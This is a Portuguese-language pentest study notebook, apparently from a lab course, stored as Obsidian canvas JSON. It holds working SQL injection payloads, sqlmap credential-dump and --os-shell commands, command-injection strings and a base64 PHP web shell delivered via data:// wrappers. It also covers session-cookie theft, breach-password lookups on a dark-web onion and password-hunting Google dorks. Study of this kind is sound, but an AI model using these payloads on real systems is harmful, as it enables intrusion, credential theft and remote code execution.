		{"id":"8a3dc8b754ccfb2e","type":"text","text":"## Blind SQL Injection\n\nBlind sql e um sql meio que as cegas, ou seja a aplicacao nao vai te devolver um erro ou algo do tipo\n\nRelembrando a logica boleana\n```\nAND\n3=3 AND 2=2 = verdadeiro\n3=3 AND 2=1 = falso\n\nOR\n3=3 OR 2=1 = verdadeiro\n```\n\nmesmo se colocarmos a aspas simple ele nao funcionaria pois ele nao iria retornar erro\n![[brave_1x8P3JoZfX.png]]\n\nPara descobrir se o aplicacao e vulneravel nos precisamos criar uma condicao verdadeira , vamos fazer isso, ele ira retornar um erro, sempre que for uma logica verdadeira ele ira retornar algum erro\n```\n1' and 1=1#\n```\n![[brave_D4ljkaCZgN.png]]\n```\n' or true#\n```\n![[brave_PIt7sww7NV.png]]\n\nvamos tentar descobrir a quantidade de colunas, lembrando que aumentamos ate dar erro ou nao aparecer nada no caso\n```\n' or 2=2 order by 3#\n```\n![[brave_Xs9aNX3gWn.png]]\n\ndescobrimos que temos 2 colunas, vamos explorar ela\n```\n' or 2=2 union select 1,user()#\n```\n![[brave_wgebKE4whE.png]]\n\ne assim vai com a enumeracao padrao","x":13010,"y":-7175,"width":749,"height":1100,"color":"1"},
		{"id":"9c82259ef2669826","type":"text","text":"## SQL Injection Error Based\n\no tipo de error based geralmente retorna algum tipo de erro para o usuario\n\naqui no campo abaixo temos uma area chamada agencias, clicando em uma delas sera redirecionado para uma pagina\n![[brave_01VrZUebXw.png]]\n\nquando clicamos em sao paulo vem esta pagina assim como os outros\n![[brave_H6CATpbqMm.png]]\n\nna url notamos uma coisa interesante , aqui ela esta passando o parametro sp ou seja se nos colocarmos outro tipo entao seremos redirecionados para outro local\n```\n172.16.1.10/turismo/agencias.php?loja=sp\n```\n![[brave_JK2ZG2W7qE.png]]\n\nate ai tudo bem, mas quando colocamos uma aspas simples ele vai nos retornar um erro\n```\n172.16.1.10/turismo/agencias.php?loja=sbc'\n```\n![[brave_ej9ZtAF2R1.png]]\n\nolhando o codigo fonte conseguimos ver o erro melhor aparentemente esta reclamando que tem uma aspas a mais do que deveria\n![[brave_13ZmKHSWMm.png]]\n\nVamos fazer um injecao sql atravez disso, e comecar a extrair informacoes do banco de dados\n\naqui esta selecionando a 1 coluna, note que temos um %23 isso e basicamente # para que oque estiver depois disso seja ignorado\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1 %23\n```\n![[brave_znGt8qldPH.png]]\n\nesta falando que o numero de colunas e diferente e agora oque precisamos fazer e ir adicionando valores de colunas ate que nao de o erro\nquando chegamos no numero 5 ele nos retorna algo\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,3,4,5 %23\n```\n![[brave_f5AkBxpf32.png]]\n\numa coisa de se fazer e que nos podemos colocar qualquer tipo de numero, pois o resultado sera o mesmo \n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 100,101,102,103,104 %23\n```\n![[brave_LSFYPVTVkI.png]]\n\nbom se nos colocarmos um numero a mais ele vai retornar o erro novamente\nou seja, agora sabemos que esta tabela tem 5 colunas\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,3,4,5,6 %23\n```\n![[brave_znGt8qldPH.png]]\n\nVamos dar uma olhada no backend\n![[brave_05S0bakHHO.png]]\n![[brave_RWH8w5GPJQ.png]]\n![[brave_wUWWAknMUK.png]]\n\n\nVamos voltar a exploracao, um outro geito de descobrir as colunas e com o orderby\naqui e so ir aumentando o numero ate chegar ao 6\n```\n172.16.1.10/turismo/agencias.php?loja=' order by 6 %23\n```\n\naqui no caso estamos justamente buscando por este erro, pois usando o orderby voce tem que passar o numero de colunas para descobrir o numerro de colunas, por exemplo aqui deu erro no 6, entao o numero de colunas e 5\n![[brave_T2MKGwilQS.png]]\n\nvoltando ao nosso codigo agora vamos pegar algumas informacoes\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,3,4,5 %23\n```\n![[brave_x8JtBGZYlF.png]]\n\nsabemos que temos agencia com 3 , local com 4 e telefone com 5.\nvamos mudar algumas coisas, no lugar do 3 podemos fazer algumas consultas\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,version(),4,5 %23\n```\n![[brave_zp3Su5dh6O.png]]\n\nno 4 vamos mandar o user\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,version(),user(),5 %23\n```\n![[brave_hrsmPmc5ME.png]]\n\nno 5 podemos pedir qual e o nome da database\n```\n172.16.1.10/turismo/agencias.php?loja=sp' union select 1,2,version(),user(),database() %23\n```\n![[brave_HRwGv6oAYt.png]]\n","x":12090,"y":-7175,"width":749,"height":1100,"color":"1"},
		{"id":"0497af5db9ff527d","type":"text","text":"## Automatizando os testes de SQLi\n\nVamos usar a ferramenta sql map\noque podemos fazer e achar os vetores de ataque e vulnerabilidade manualmente\n\nvamos pegar o site que ja testamos\n```\n172.16.1.10/turismo/agencias.php?loja=sp\n```\n![[brave_7l0F7g27qw.png]]\n\nQuando ja identificamos a vulnerabilidades podemos usar a ferramenta sqlmap\n\nso um adendo que podemos passar o tipo de banco de dados que esta sendo usado mas nao e nescessario\n```kali\nsqlmap -u \"172.16.1.10/turismo/agencias.php?loja=sp\" --dbms=mysql\n```\n\nTraz a base de dados atual\n```kali\nsqlmap -u \"172.16.1.10/turismo/agencias.php?loja=sp\" --current-db\n```\n\nTraz todas as bases de dados \n```kali\nsqlmap -u \"172.16.1.10/turismo/agencias.php?loja=sp\" --dbs\n```\n\nTraz todas as tabelas de dbmrtur\n```kali\nsqlmap -u \"172.16.1.10/turismo/agencias.php?loja=sp\" -D dbmrtur --tables\n```\n\nTraz as colunas dentro da tabela\n```kali\nsqlmap -u \"172.16.1.10/turismo/agencias.php?loja=sp\" -D dbmrtur -T mrusesrs --columns\n```\n\nTraz as informacoes dentro das colunas\n```kali\nsqlmap -u \"172.16.1.10/turismo/agencias.php?loja=sp\" -D dbmrtur -T mrusesrs -C 'id,login,senha' --dump\n```\n\nPodemos pedir o usuario atual\n```kali\nsqlmap -u \"172.16.1.10/turismo/agencias.php?loja=sp\" --current-user\n```\n\nPodemos pedir todos os usuarios\n```kali\nsqlmap -u \"172.16.1.10/turismo/agencias.php?loja=sp\" --users\n```\n\nPodemos pedir todas as senhas\n```kali\nsqlmap -u \"172.16.1.10/turismo/agencias.php?loja=sp\" --password\n```\n\nPodemos pedir uma shell tambem\n```kali\nsqlmap -u \"172.16.1.10/turismo/agencias.php?loja=sp\" --os-shell\n```\n\nQuando precisamos utilizar e identificar a vulnerabilidade atraves do metodo post\n```kali\nsqlmap -u \"172.16.1.10/turismo/login.php\" --forms\n```\n","x":13930,"y":-8520,"width":749,"height":1100,"color":"#00fbff"},
		{"id":"5fc7876d8178155f","type":"text","text":"## Command Injection\n\nComand injection e uma vulnerabilidade que ocorre quando a aplicacao ou o desenvolvedor implementa uma nova funcao para executar comandos no sistema operacional \n\nno caso temo um site com esta vulnerabilidade \n```\n172.16.1.10/hosting/\n```\n![[brave_45sPsazIKy.png]]\n![[brave_RwZQZQIWsr.png]]\n\neste site esta executando o comando whois, oque nos podemos fazer e explorar esta vulnerabilidade \n\no ploblema e que nos temos controle do campo em que nos digitamos o nome do site, so que se a aplicacao nao estiver tratando corretamente essa funcao de executar comandos no sistema operacional nos vamos conseguir executar qualquer outro comando.\n\nVamos fazer isso, o mas comun que podemos fazer e colocar um ;ls e ver se retorna algo\n![[brave_YgeNzqGk7F.png]]\n\npodemos tentar tambem com |ls\n![[brave_P8vhWwoZPV.png]]\n\nse ela nao estiver tratando nada e bem provavel que iriemos consegui enviar o comando apenas com isto, mas aqui temos um certo tipo de tratamento\n\nVamos ver isso usando o burp, vemos que e uma saida normal sem nada\n![[brave_Jspz3XoJtb.png]]\n\noque nos podemos tentar fazer e colocar uma ;ls, vamos ver que quando fizermos isso a aplicacao ira retornar mas informacoes do que antes\n```\nsite=google.com;ls\n```\n![[brave_zLUWoIBTP1.png]]\n![[brave_HNvAXLt9aO.png]]\n\nVamos entender o whois\n```kali\nwhois google.com\n```\nesta e a saida normal do whois\n![[brave_IPra9iUYYK.png]]\n\noque o site esta fazendo e filtrando apenas 2 coisas, entao ele basicamente esta dando um grep\n```kali\nwhois google.com | grep \"nserver\"\n```\n![[brave_wPnG2PIAJl.png]]\n\nNos temos controle apenas no nome do site, entao oque podemos fazer ou colocar para conseguir executar comando, vamos fazer um teste\n```kali\nwhois google.com;echo oi | grep \"nserver\"\n```\n\nquando colocamos o codigo desta forma ele recura o grep e nos retorna o whois completo\n![[brave_vPL6BS5ODR.png]]\n\noque acontece entao se nos colocarmos um outro comando junto com o grep\n```kali\nwhois google.com;echo oi;id | grep \"nserver\"\n```\n\nOque vai acontecer e que ele vai recusar o grep e o id, mas e justamente por causa disso que ele acabou nao recusando o nosso echo\n![[brave_ZhrVrkRgmW.png]]\n\ne se nos formos adicionado mas outros comandos vamos ver que ele vai executar o comando anterior\n```kali\nwhois google.com;echo oi;id;ls | grep \"nserver\"\n```\n![[brave_k0Z7CWcTfw.png]]\n\ne agora sabendo disso nos conseguimos executar os comandos no site\n![[brave_uZparUm9VO.png]]\n![[brave_ONm3A2CXnr.png]]\n\n","x":14840,"y":-7175,"width":749,"height":1100,"color":"1"},
		{"id":"085c26290a044dac","type":"text","text":"## Problemas de autorização\n\n\nE uma falha comun que encontramos o tempo todo em diversas situacoes e formas diferentes.\n\ncomo deveria ser\n![[brave_4MoAFTBN5o.png]]\n\nO problema ocore quando o usuario nao autorizado consegue acessar este recurso diretamente, sem precisar mudar o acesso dele\n![[brave_dNARU9U4dO.png]]\n\n## Exemplo prático: Autorização\nAqui no caso temos um usuario para autenticar, mas isso nao e precisso, se voce rodar o gobuster e descobrir o diretorio sucesso.php, voce pode se autenticar sem mesmo ter logado com nenhum usuario\n\nExemplo de pagina com a vulnerabilidade ricardo = usuario pago longatto = usuario limitado O ploblema ocorre quando o usuario longatto descobre aquele sucesso.php\n![[Pasted image 20230330155524.png]]\n\nVamos explorar a falha\n![[Pasted image 20230330155543.png]]\n\nVamos abrir o burp e logar com o usuario ricardo que e o usuario pago. e damos um foward\n![[Pasted image 20230330160346.png]]\n\nQuando damos o foward vemos que a pagina esta dando um get no `sucesso.php` ja que ele e usuario pago\n![[Pasted image 20230330160356.png]]\n\nSe fizermos isto para o usuario longatto que usuario gratuito ele irar dar o get em `limitado.php`\n![[Pasted image 20230330160415.png]]\n\nAgora que ja entendemos isto vamo explorar a falha. Estes dois diretorios limitado.php e sucesso.php voce acharia em uma enumeracao padrao.\n\nDigamos que eu achei esta vulnerabilidade, oque fazer para acessar como usuario pago, na hora que eu logar com usuario limitado eu posso simplesmente capturar isto com o burp e muduar o get de limitado.php para sucesso.php.\n![[Pasted image 20230330160426.png]]\n\nMudamos para sucesso.php\n![[Pasted image 20230330160438.png]]\n\nAgora estamos logado com usuario no limitado.php mas temos acesso completo agora\n![[Pasted image 20230330160448.png]]\n\nSe o servidor estiver mau configurado nos podemos usar o gobuster tambem, e quando clicamos nele nos conseguimos nos autorizar\n```kali\ngobuster dir -e -u 192.168.0.7 -w wordlist -x .php\n```\n![[brave_KLikK7GPnD.png]]\n\n## Exemplo: Cookies e Sessões\n\nBom vamos continuar com autorizacao so que desta vez e com cookies e sesoes, no caso aqui nao conseguimos sair da conta que estamos a menos que fizermos o logout, agora sempre que mandarmos a requisisao de sucesso no burp ele retorna para uma outra pagina, bloqueado.php.\n\nNa pagina de bloqueado.php nos podemos inspecionar os elementos e ir no console para digitar o seguinte comando\n```\ndocument.cookie\n```\n![[brave_LTtY0v5GOg.png]]\n![[brave_UTZ0MzKk8C.png]]\n\nOque nos poderiamos fazer?\nEstando com o acesso limitado podemos usar o gobuster e passar o nosso cookie\n```\ngobuster dir -e -u http://192.168.0.7/appsec/ -w wordlist -x .php -c \"COOKIE\"\n```\n\nUsando o gobuster vemos que ele retorna um 302 que siginifica redirecionamento, no caso esta te redirecionando para o bloqueado.php\n![[brave_SNs98c2uwK.png]]\n\nEntao e se nos nao seguimos o redirecionamento ?\nPara isto podemos usar o curl pois ele nao faz o redirecionamento direto\n```kali\ncurl -v http://192.168.0.7/appsec/sucesso.php\n```\n![[Pasted image 20230330165720.png]]\n\nnos tambem conseguimos usar o curl com o burp\n```kali\ncurl -v http://192.168.0.7/appsec/sucesso.php --proxy 172.0.0.1:8080\n```\n![[brave_66ABpsLgGO.png]]\n\nse dermos um foward vamos ver que conseguimos acessar o recurso pago\n![[brave_JwBARg83H1.png]]\n\noque nos podemos fazer tambem e ir em options e interceptar as respostas do servidor\n![[brave_bhlRewoSuK.png]]\n\nvamos usar o curl novamente\n```kali\ncurl -v http://192.168.0.7/appsec/sucesso.php --proxy 172.0.0.1:8080\n```\n\ndamos um foward\n![[brave_tXQjdAc2vG.png]]\n\nem location em vez de index.php podemos colocar aonde e para ser redirecionado no caso para sucesso.php\n![[brave_Wc0rq2jskd.png]]\n\nQuando damos o foward vemos a resposta\n![[brave_AbQg5ITiI0.png]]\n\nVamos fazer um sequestro de secao do usuario pago\n\nno kali abrimos o nc para escutar a porta\n```kali\nnc -vnlp -8081\n```\n\noque podemos fazer e gerar um link ou uma url maliciosa e enviar para vitima, quando ela acessar nos iremos receber a secao com o cookie\n![[brave_ZDnDaTLusw.png]]\n\nagora com o cookie em maos, podemos inspecionar a pagina do acesso limitado e mudar o cookie para o do autorizado\n![[brave_hFVxj06VuP.png]]\n![[brave_GxF684JLRV.png]]\n\n","x":14840,"y":-5820,"width":749,"height":1100,"color":"1"},
		{"id":"5a6df931aa308a37","type":"text","text":"## File Disclosure\n\nGeralmente ela ocorre quando temos uma campo para download e upload\n\nVamos ver isso na parte de download\ntemos um download de nota fiscal\n![[brave_cWJGKGbH2N.png]]\n\nquando clicamos nele nos somos redirecionados para outra pagina\n![[brave_7KmvNMNFrD.png]]\n\noque nos podemos fazer e usar o burp para verificar oque esta acontecendo \n![[brave_wm7WszCbwU.png]]\n\nVemos que a aplicacao tem um cookie de download que parece encodado em base64, vamos decodar ela\n![[brave_Tu9kBopq9R.png]]\n\nvemos que o valor dele e false \n![[brave_rWg2HZbBFk.png]]\n\noque podemos fazer e alterar este valor para true\n![[brave_4WeXzv5ZDm.png]]\n\nAgora com o valor em mao podemos mandar a nossa requisicao para o repeater e enviar o nosso valor de true encodado\n![[brave_FnsIBMx4Uc.png]]\n\nVemos que tem uma area que esta dando um GET em NP_890823.pdf, oque nos podemos fazer e alterar o nome deste arquivo para outro, como nao conhecemos nenhum nome de arquivo dentro da aplicacao oque podemoso fazer e usar o propio download.php que esta na url\n![[brave_lveUv2t3H8.png]]\n\nquando enviamos a requisicao para a aplicacao ela ira retornar o arquivo download.php ou seja aquele cookie que colocamos nos permite baixar arquivos\n![[brave_ECIxeaEjv7.png]]\n\nIsso e uma forma de fazermos este ataque, outra forma e pelo navegador \nna pagina de redirecionamento do downlad nos podemos inspecionar os elementos\n![[brave_k0VyqUy6pG.png]]\n\nInspecionamos a pagina e pagamos o cookie da sessao de download\n``document.cookie``\n![[Pasted image 20230331125340.png]]\n\nO cookie esta encodado em base64 vamos decodalo\nVemos que o cookie tem o valor de false\n```\necho ZmFsc2UK | base64 -d\n```\n![[Pasted image 20230331125423.png]]\n\nSabendo disto podemos encodar o valor para true\n```\necho -n true | base64\n```\n![[Pasted image 20230331125437.png]]\n\nAgora podemos voltar no nosso site inspecionar elementos ir em storage e mudar o cookie que pegamos para oque acabamos de gerar como o valor \"true\"\n![[Pasted image 20230331125555.png]]\n\nAgora podemos tentar baixar o aquivo, caso nao baixe podemos tentar colocar outros tipos de arquivos que descobrimos na enumeracao\n![[Pasted image 20230331125701.png]]\nQuando colocamos download.php na pagina e damos enter agora conseguimos baixar o arquivo\n![[brave_q3AVXFiMVk.png]]\n\noque nos podemos fazer agora e fazer uma analise e tentar pegar informacoes, um exemplo disso e o index.php que podemos baixar\n![[brave_xXlwdK6rpj.png]]\n\nVamos ver oque tem dentro do index.php\n```kali\nnano index.php\n```\n![[brave_fZZeugrTbK.png]]\n\nDentro deste index temos outro arquivo chamado connecta.php do qual podemos fazer o download\n![[brave_6xcZ6FUk9o.png]]\n\nQuando olhamos dentro do arquivo vemos que temos o usuario e a senha do banco de dados\n```kali\nnano connecta.php\n```\n![[brave_20OaHdeOwD.png]]\n\noque nos podemos fazer agora e se conectar ao banco de dados\nvamos ver qual a porta esta rodando o banco de dados\n```kali\nnmap -v -Pn 172.30.0.20\n```\n![[brave_0rMInSJqJ9.png]]\n\nSabendo disso vamos nos conectar com as informacoes que achamos\n```kali\nmysql -h 172.30.0.20 -u root -p nf\n```\n![[brave_k5D6MwumTL.png]]\n![[brave_W0wLv8rbOH.png]]\n\noque nos podemos fazer agora e quebrar a hash e tentar se autenticar em algum servidor ssh que esteja aberto\n","x":14840,"y":-4519,"width":749,"height":1100,"color":"2"},
		{"id":"d71a1ae569cfdda2","type":"text","text":"## PHP Wrappers\n\nvamos usar um novo site para fazer os testes\n![[Pasted image 20230331160421.png]]\n\nMas antes disso vamos falar sobre php wrappers\nneste link temos a documentacao do php wrappers https://www.php.net/manual/pt_BR/wrappers.php\n![[brave_4mj7Hsva15.png]]\n\nBom voltando no site temos uma area para enviar curriculo com o GET na url\n![[brave_tOaeH15yMC.png]]\n![[brave_ZisAfV4jOS.png]]\n\nSe nos adicionarmos uma aspas simples ele ira reclamar do include\n![[brave_EgQuuM83YG.png]]\n\numa coisa a se notar e que quando colocamos qualquer outra coisa ele reclama e adiciona um .php no final do nome\n![[brave_CtWNBGmoW9.png]]\n\nBom geralmente nos colocariamos o nullbite(%00) para remover este .php, mas no caso de versoes mas recente do php isso nao funciona\n![[brave_0clbjUR2Qg.png]]\n\nVamos inspecionar a pagina e notamos que ele falhou em abrir o arquivo kair\n![[brave_JRObxNkZMa.png]]\n\nIsso e porque o php mas novo se voce tenta fazer a falha de lfi por exemplo voce nao vai conseguir usar o nullbite, exemplo abaixo\nnote que ele adiciona o .php no final\n![[brave_87oUfQ7f9l.png]]\nVamos tentar colocar o nullbite para remover o .php, mas nao vai funcionar\n![[brave_WJkKiRDZv1.png]]\n\nNeste casso e que o php wrappers funciona para gente\n![[brave_4nhfS4c8Ai.png]]\n\nVamos tentar usar o data:// para termos acesso\n```\ndata://text/plan,\n```\n\nVamos tentar mandar um texto para do servidor\n```\nhttp://rh.businesscorp.com.br/?page=data://text/plan,Kairwne\n```\n![[brave_Vv23u22Mc7.png]]\n\nnada vai acontecer porque temos que olhar no codigo fonte da pagina\nVemos que ele nao reclamou que nem avia reclamado antes\n![[brave_khyPVKwgO8.png]]\n\nPodemos fazer isso com base64 \n```\nhttp://rh.businesscorp.com.br/?page=data://text/plan;base64,a2FpcnduZQ==\n```\n![[brave_0z9adLddGN.png]]\n\nsabendo disso oque podemos fazer para explorar a vulnerabilidade e encodar os nossos comandos em base64\n```kali\necho -n '<?php system(id);?>' | base64\n```\n\nVamos enviar o comando para o servidor, vemos que o comando foi executado com sucesso\n```\nhttp://rh.businesscorp.com.br/?page=data://text/plan;base64,PD9waHAgc3lzdGVtKGlkKTs/Pg==\n```\n![[brave_hWnrKUrqsV.png]]\n\nAgora nos podemos fazer algo mas profissional e mandar uma shell para o servidor\n```kali\necho -n '<?php system($_GET['hack']); ?>'\n```\n\nVamos enviar para o servidor\n```\nview-source:http://rh.businesscorp.com.br/?page=data://text/plan;base64,PD9waHAgc3lzdGVtKCRfR0VUWydoYWNrJ10pOyA/Pg==&hack=ls\n```\n![[brave_gNwcMema20.png]]\n\n","x":14840,"y":-3221,"width":749,"height":1100,"color":"3"},
		{"id":"75c75698bed3d9d9","type":"text","text":"## Explorando CMS Joomla\n\nTemos um site com esta falha\n```\n172.30.0.106\n```\n![[brave_3HKGLe7MGH.png]]\n\nVendo o codigo fonte da pagina conseguimos ver que ele e um servidor joomla\n![[brave_K5o8akwEZ1.png]]\n\nQuando temos um sistema destes que nao conhecemos ou que nunca vimos e legal que nos sempre olhamos no google, procurando por joomla no github conseguimos achar o repositorio dele\n![[brave_U3Jx8nTioy.png]]\n\nNos temos uma ferramente para fazer o scan em um servidor joomla\n```\njoomscan -u http://172.30.0.106/\n```\n![[Pasted image 20230331170859.png]]\n\nPodemos dar uma olhada no exploit db e no searchsploit por vulnerabilidades tambem\n```\nsearchsploit \"joomla 3.7\"\n```\n![[Pasted image 20230331170932.png]]\n\nNeste caso o joomla tem uma vulnerabilidade sql em um dos diretorios\n![[brave_EEvPYGlm5l.png]]\n\nAcessando este diretorio nos encontramos a vulnerabilidade\n![[brave_bX79P1Zn5W.png]]\n\noque nos podemos fazer e mandar este link para o sqlmap \n```\nsqlmap -u \"http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]\n```\n\n","x":14840,"y":-1923,"width":749,"height":1100,"color":"2"},
		{"id":"8276e1bc4b7cc4aa","type":"text","text":"## Automatizando Command Injection\n\nTemos uma ferramenta chamada commix da qual vamos usar, esta ferramenta nos dara varias payloads para command injection\n```kali\ncommix --url https://google.com/ --data=\"site=bussinescorp.com\"\n```\n\nPara saber o parametro de pesquisa do site --data temos que olhar com o burp ou no codigo fonte\n![[brave_Zy1SwBOfqx.png]]\n\nNa ferramenta quando executada ele ira tentar fazer as injecoes e as payloads\n![[brave_RecWSVwKaE.png]]\n\n","x":14840,"y":-8180,"width":749,"height":760,"color":"#00f7ff"},
		{"id":"eee3bfc938e4c5dc","type":"text","text":"## Testando e explorando Wordpress\n\n![[Pasted image 20230331194439.png]]\n\nFazemos uma enumeracao padrao de diretorio e dns\n```kali\ngobuster dns -d grupobusinesscorp.com -w /usr/share/wordlists/dirb/small.txt -t 30\n```\n\n```kali\ngobuster dir -e -u http://blog.grupobusinesscorp.com/ -w /usr/share/wordlists/dirb/small.txt -t 30\n```\n\n![[Pasted image 20230331194528.png]]\n\nAchamos um wordpress do diretorio blog, se acesarmos e colocarmos readme.html sera mostrado a versao.\n![[Pasted image 20230331194548.png]]\n\nExiste uma base de dados atualizada para vulnerabilidades do WordPress, o nome do site e wpvulndb.com\n``https://wpvulndb.com``\n![[Pasted image 20230331194600.png]]\n\nAlguns sites podem ate ter o wordpress atualizado mas muitas vezes esquece de atualizar um plugin e ai que estao as vulnerabilidades.\n\nVamos usar o wpscan\n```\nwpscan --url blog.grupobusinesscorp.com/blog --api-token APITOKEN\n```\n\n```kali\nwpscan --url blog.grupobusinesscorp.com/blog --api-token APITOKEN --enumerate p\n```\n\n```kali\nwpscan --url blog.grupobusinesscorp.com/blog --api-token APITOKEN --enumerate --plugins-detection aggressive\n```\n\n![[Pasted image 20230331194652.png]]\n\nPlugins vulneraveis\n```\nwpscan --url blog.grupobusinesscorp.com/blog --api-token APITOKEN --enumerate --plugins-detection aggressive\n```\n![[Pasted image 20230331195005.png]]\n\nApartir daqui e fazer uma pesquisa das vulnerabilidade testar elas e ficar atento aos detalhes, acesse todos os sites que e pedido abaixo e teste as vulnerabilidades\n![[Pasted image 20230331195014.png]]\n\nTemos um wp-forum, podemos ir nos sites abaixo e buscar como explorar esta vulnerabilidade \n![[Pasted image 20230331195033.png]]\n\nSe tentarmos colocar ele na url nao vai funcionar poque o feed.php nao  existe, oque podemos fazer  e procurar por ele no google\n![[Pasted image 20230331195050.png]]\n![[brave_A3Y03t2X8m.png]]\n\nAqui agora e oque ja aprendemos","x":15720,"y":-1923,"width":749,"height":1100,"color":"1"},
		{"id":"9fb285e616e9bb99","type":"text","text":"## Obtendo RCE via Wordpress\n\n``37.59.174.231/blog/wp-admin``\nSe voce encontrou alguma vulnerabilidade como na aula passada, voce provavelmente vai estar autenticado no servidor com senha e usuario, agora precisamos evoluir para um rce, entao temos que procurar um local com permisao de escrita.\nBusque por permisao de escrita no servidor\n![[Pasted image 20230331195341.png]]\n\nConseguimos achar um aquivo que permite escrita, agora colocamos o comando que queremos e vamos ter que acessar este arquivo\n![[Pasted image 20230331195351.png]]\n\nA questao e aonde esta o arquivo 404.php?, e por isto que fizemos  a aula de mind set, porque ja que voce tem acesso ao banco de dados e diretorios no seu mysql, entao voce pode navegar ate achar este arquivo, ou ate mesmo sem ser no mysql, apenas navegando nos aquivos que baixamos.\n![[Pasted image 20230331195400.png]]\n\nAqui agora podemos colocar nossa shell\n![[Pasted image 20230331195407.png]]\n![[Pasted image 20230331195410.png]]\n\nAgora quando acessamos o diretorio podemos executar comandos\n![[Pasted image 20230331195417.png]]\n","x":15720,"y":-3221,"width":749,"height":1100,"color":"#0400ff"},
		{"id":"d2862136727b5c5f","type":"text","text":"## Mapeando Colaboradores\n\n![[Screenshot_133.png]]\n","x":1314,"y":-1080,"width":782,"height":420,"color":"4"},
		{"id":"b438ccf19641451a","type":"text","text":"## Coleta via vagas de emprego\n![[Screenshot_134.png]]\n","x":1311,"y":-1680,"width":789,"height":460,"color":"4"},
		{"id":"6960d0d510e5196f","type":"text","text":"## Coletando endereços de E-mail\nhunter.io\n![[Screenshot_135.png]]\n![[Screenshot_136.png]]\n\nPodemos usar o theHarvester tambem para coleta de email\n\nTheHarvester\n\n```bash\n#instalacao\napt install theharvester\n#-------------------------#\n#instalando uma api\n#va ao site pedido e crie uma conta e pegue a api deste site e coloque no theharvester\ncd /etc/theHarvester/\nnano api-keys.yaml\n#-------------------------#\n#uso\ntheharvester -d businesscorp.com.br -l 100 -b google -f resultado.html\n```\n","x":2269,"y":-1680,"width":891,"height":1020,"color":"4"},
		{"id":"2cb91fb2adae4fb0","type":"text","text":"## Vazamento de Dados (Leaks)\n![[Screenshot_137.png]]\n![[Screenshot_138.png]]\n\n![[Screenshot_139.png]]\n\n![[Screenshot_140.png]]\n","x":2269,"y":-2800,"width":891,"height":1000,"color":"4"},
		{"id":"0aaff8e8f6547976","type":"text","text":"## Consultando Leaks na Dark Web\n\n\n![[Screenshot_141.png]]\n\nhttp://pwndb2am4tzkvold.onion/\n![[Pasted image 20230505090227.png]]\n\n### Utilizando a Rede TOR no Kali\n\n```bash\n#instala o tor e o proxychains\napt install tor proxychains\n#inicia o tor\nsevice tor start\n#configuracao do proxychains\nnano /etc/proxychains.conf \n#ative o dynamic_chain\n#dessa ate o final do arquivo e crie um socks5 com o mesmo ip e porta que o outro\n```\n\n","x":1311,"y":-2791,"width":782,"height":983,"color":"4"},
		{"id":"dbeae1aa9bc88056","type":"text","text":"## Script para consulta de Leaks\n\nhttps://github.com/limkokholefork/karma\n\n#### Installation\n\nInstall dependencies (Debian/Ubuntu):\n\n```\nsudo apt install tor python3 python3-pip\n```\n\nInstall with `pip3`:\n\n```\nsudo -H pip3 install git+https://github.com/decoxviii/karma.git\nkarma --help\n```\n\n---\n\n#### Building from Source\n\nClone this repository, and:\n\n```\ngit clone https://github.com/decoxviii/karma.git ; cd karma\nsudo -H pip3 install -r requirements.txt\npython3 setup.py build\nsudo python3 setup.py install\n```\n\n---\n\n#### Update\n\nTo update this tool to the latest version, run:\n\n```\nsudo -H pip3 install git+https://github.com/decoxviii/karma.git --upgrade\nkarma --version\n```\n\n---\n\n#### Usage\n\nStart by printing the available actions by running `karma --help`. It's also necessary to restart the **Tor** service `sudo service tor restart`. Then you can perform the following tests:\n\n1.  Search emails with the password: `123456789`\n\n```\nkarma search '123456789' --password -o test1\n```\n\n2.  Search emails with the local-part: `johndoe`\n\n```\nkarma search 'johndoe' --local-part -o test2\n```\n\n3.  Search emails with the domain: `hotmail.com`\n\n```\nkarma search 'hotmail.com' --domain -o test3\n```\n\n4.  Search email password: `johndoe@unknown.com`\n\n```\nkarma target 'johndoe@unknown.com' -o test4\n```","x":1311,"y":-3520,"width":782,"height":560,"color":"4"},
		{"id":"19297a089f866535","type":"text","text":"## Coleta de dados no Pastebin\n\n![[Screenshot_142.png]]\n![[Pasted image 20230505090345.png]]\n\n","x":2269,"y":-3520,"width":891,"height":560,"color":"4"},
		{"id":"7ba4ccf3d144660e","type":"text","text":"## Coleta de dados no Trello\n\n```web\nsite:trello.com \"bussinescorp.com.br\" projetos\n```\n![[Screenshot_143.png]]\n","x":2269,"y":-4060,"width":891,"height":380,"color":"4"},
		{"id":"7073ea04c75835bd","type":"text","text":"## Buscando domínios similares\n\n![[Screenshot_144.png]]\n![[Screenshot_145.png]]\n\nvamos encontrar esses dominios\n```kali\nurlcrazy google.com\n```","x":1311,"y":-4060,"width":782,"height":380,"color":"4"},
		{"id":"4828f5025687a707","type":"text","text":"## Pesquisando cache de sites\n\nessa tecnica tem por finalidade descobrir coisas passadas\npodemos usar o site \"https://web.archive.org/\"\n\n![[Screenshot_146.png]]\n![[Screenshot_147.png]]\n\n","x":1311,"y":-4680,"width":782,"height":480,"color":"4"},
		{"id":"3051aa8b05716946","type":"text","text":"## Introdução ao Google Hacking\n\n![[Screenshot_148.png]]\n![[Screenshot_149.png]]\n","x":2269,"y":-4680,"width":891,"height":480,"color":"4"},
		{"id":"99e45490fcc6b797","type":"text","text":"## Google Hacking\n\n![[Screenshot_150.png]]\n\n```google\nintitle:\"Acesso restrito\"\nintext:\"Acesso restrito\"\ninurl:\"Acesso restrito\"\n\n:.com.br filetype:txt senha\nfiletype:txt inurl:senha\ncache:urldoarquivodasenha\n```","x":2269,"y":-5240,"width":891,"height":440,"color":"4"},
		{"id":"d360627e93855242","type":"text","text":"## Google Hacking aplicado ao Pentest\n\n```bash\n#limite a busca ao dominio desejado \nsite:itau.com.br\n\n#diminua os resultados das pesquisas combine operadores\nsite:itau.com.br ext:php\nsite:itau.com.br --www\nsite:itau.com.br --www --forum -ir\n```\n","x":1311,"y":-5240,"width":782,"height":440,"color":"4"},
